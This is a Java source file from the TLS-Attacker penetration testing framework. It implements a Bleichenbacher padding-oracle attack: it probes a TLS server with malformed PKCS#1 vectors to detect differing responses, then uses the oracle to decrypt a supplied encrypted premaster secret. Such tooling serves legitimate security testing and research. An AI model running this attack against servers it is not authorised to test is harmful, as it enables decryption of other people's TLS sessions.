/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherVulnerabilityMap;
import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowType;
import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1Vector;
import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1VectorGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.VectorFingerprintPair;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.attacks.util.response.EqualityError;
import de.rub.nds.tlsattacker.attacks.util.response.EqualityErrorTranslator;
import de.rub.nds.tlsattacker.attacks.util.response.FingerPrintChecker;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseExtractor;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsattacker.core.util.LogLevel;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import java.io.IOException;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;

/**
 * Sends differently formatted PKCS#1 messages to the TLS server and observes
 * the server responses. In case there are differences in the server responses,
 * it is very likely that it is possible to execute Bleichenbacher attacks.
 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private final Config tlsConfig;

    private BleichenbacherWorkflowType vulnerableType;

    public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig) {
        super(bleichenbacherConfig);
        tlsConfig = bleichenbacherConfig.createConfig();
    }

    public State executeTlsFlow(BleichenbacherWorkflowType type, byte[] encryptedPMS) {
        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, type, encryptedPMS);
        State state = new State(tlsConfig, trace);
        tlsConfig.setWorkflowExecutorShouldClose(false);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        return state;
    }

    @Override
    public Boolean isVulnerable() {
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return null;
        }
        LOGGER.info("Fetched the following server public key: " + publicKey);

        List<Pkcs1Vector> pkcs1Vectors = Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
                tlsConfig.getDefaultHighestClientProtocolVersion());

        // we execute the attack with different protocol flows and
        // return true as soon as we find the first inconsistency
        LOGGER.log(LogLevel.CONSOLE_OUTPUT,
                "A server is considered vulnerable to this attack if it responds differently to the test vectors.");
        LOGGER.log(LogLevel.CONSOLE_OUTPUT, "A server is considered secure if it always responds the same way.");
        for (BleichenbacherWorkflowType bbWorkflowType : BleichenbacherWorkflowType.values()) {
            LOGGER.debug("Testing: " + bbWorkflowType);
            EqualityError error = isVulnerable(bbWorkflowType, pkcs1Vectors);
            if (error != EqualityError.NONE) {
                vulnerableType = bbWorkflowType;
                return true;
            }
        }

        return false;
    }

    private EqualityError isVulnerable(BleichenbacherWorkflowType bbWorkflowType, List<Pkcs1Vector> pkcs1Vectors) {
        List<VectorFingerprintPair> bleichenbacherVectorMap = getBleichenbacherMap(bbWorkflowType, pkcs1Vectors);
        if (bleichenbacherVectorMap.isEmpty()) {
            LOGGER.warn("Could not extract Fingerprints");
            return null;
        }
        printBleichenbacherVectormap(bleichenbacherVectorMap);
        EqualityError error = getEqualityError(bleichenbacherVectorMap);
        if (error == EqualityError.SOCKET_EXCEPTION || error == EqualityError.SOCKET_STATE) {
            LOGGER.debug("Found a Socket related side channel. Rescanning to confirm.");
            // Socket Equality Errors can be caused by problems on on the
            // network. In this case we do a rescan
            // and check if we find the exact same answer behaviour (twice)
            List<VectorFingerprintPair> secondBleichenbacherVectorMap = getBleichenbacherMap(bbWorkflowType,
                    pkcs1Vectors);
            EqualityError error2 = getEqualityError(secondBleichenbacherVectorMap);
            BleichenbacherVulnerabilityMap mapOne = new BleichenbacherVulnerabilityMap(bleichenbacherVectorMap, error);
            BleichenbacherVulnerabilityMap mapTwo = new BleichenbacherVulnerabilityMap(secondBleichenbacherVectorMap,
                    error2);
            if (mapOne.looksIdentical(mapTwo)) {
                List<VectorFingerprintPair> thirdBleichenbacherVectorMap = getBleichenbacherMap(bbWorkflowType,
                        pkcs1Vectors);
                EqualityError error3 = getEqualityError(secondBleichenbacherVectorMap);
                BleichenbacherVulnerabilityMap mapThree = new BleichenbacherVulnerabilityMap(
                        thirdBleichenbacherVectorMap, error3);
                if (!mapTwo.looksIdentical(mapThree)) {
                    LOGGER.debug("The third scan prove this vulnerability to be non existent");
                    error = EqualityError.NONE;
                }
            } else {
                LOGGER.debug("The second scan prove this vulnerability to be non existent");
                error = EqualityError.NONE;
            }
        }
        if (error != EqualityError.NONE) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Found a vulnerability with " + bbWorkflowType.getDescription());
        }
        return error;
    }

    public EqualityError getEqualityError(List<VectorFingerprintPair> bleichenbacherVectorMap) {
        ResponseFingerprint fingerprint = bleichenbacherVectorMap.get(0).getFingerprint();
        for (VectorFingerprintPair pair : bleichenbacherVectorMap) {
            EqualityError error = FingerPrintChecker.checkEquality(fingerprint, pair.getFingerprint(), false);
            if (error != EqualityError.NONE) {
                LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Found an EqualityError!");
                LOGGER.log(LogLevel.CONSOLE_OUTPUT,
                        EqualityErrorTranslator.translation(error, fingerprint, pair.getFingerprint()));
                return error;
            }
        }
        return EqualityError.NONE;
    }

    private void printBleichenbacherVectormap(List<VectorFingerprintPair> bleichenbacherVectorMap) {
        LOGGER.debug("Vectormap:");
        LOGGER.debug("---------------");
        for (VectorFingerprintPair pair : bleichenbacherVectorMap) {
            LOGGER.debug(pair);
        }
        LOGGER.debug("---------------");
    }

    private List<VectorFingerprintPair> getBleichenbacherMap(BleichenbacherWorkflowType bbWorkflowType,
            List<Pkcs1Vector> pkcs1Vectors) {
        List<VectorFingerprintPair> bleichenbacherVectorMap = new LinkedList<>();
        for (Pkcs1Vector pkcs1Vector : pkcs1Vectors) {
            ResponseFingerprint fingerprint = getFingerprint(bbWorkflowType, pkcs1Vector.getEncryptedValue());
            if (fingerprint != null) {
                bleichenbacherVectorMap.add(new VectorFingerprintPair(fingerprint, pkcs1Vector));
            }
        }
        return bleichenbacherVectorMap;
    }

    private ResponseFingerprint getFingerprint(BleichenbacherWorkflowType type, byte[] encryptedPMS) {
        State state = executeTlsFlow(type, encryptedPMS);
        if (state.getWorkflowTrace().allActionsExecuted()) {
            ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(state);
            clearConnections(state);
            return fingerprint;
        } else {
            LOGGER.warn("Could not execute Workflow. Something went wrong... Check the debug output for more information");
        }
        return null;
    }

    @Override
    public void executeAttack() {
        // needs to execute the isVulnerable method to configure the workflow
        // type
        boolean vulnerable = isVulnerable();
        LOGGER.info("Using the following oracle type: {}", vulnerableType);

        if (!vulnerable) {
            LOGGER.warn("The server is not vulnerable to the Bleichenbacher attack");
            return;
        }
        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
        if (publicKey == null) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }

        if (config.getEncryptedPremasterSecret() == null) {
            throw new ConfigurationException("You have to set the encrypted premaster secret you are "
                    + "going to decrypt");
        }

        LOGGER.info("Fetched the following server public key: " + publicKey);
        byte[] pms = ArrayConverter.hexStringToByteArray(config.getEncryptedPremasterSecret());
        if ((pms.length * 8) != publicKey.getModulus().bitLength()) {
            throw new ConfigurationException("The length of the encrypted premaster secret you have "
                    + "is not equal to the server public key length. Have you selected the correct value?");
        }
        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, config,
                extractValidFingerprint(publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()), null,
                vulnerableType);
        Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
        attacker.attack();
        BigInteger solution = attacker.getSolution();
        LOGGER.log(LogLevel.CONSOLE_OUTPUT, solution.toString(16));
    }

    private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey, ProtocolVersion version) {
        return getFingerprint(vulnerableType, Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version)
                .getEncryptedValue());
    }

    private ResponseFingerprint extractInvalidFingerprint() {
        return null;
    }

    private void clearConnections(State state) {
        try {
            state.getTlsContext().getTransportHandler().closeConnection();
        } catch (IOException ex) {
            LOGGER.debug(ex);
        }
    }
}
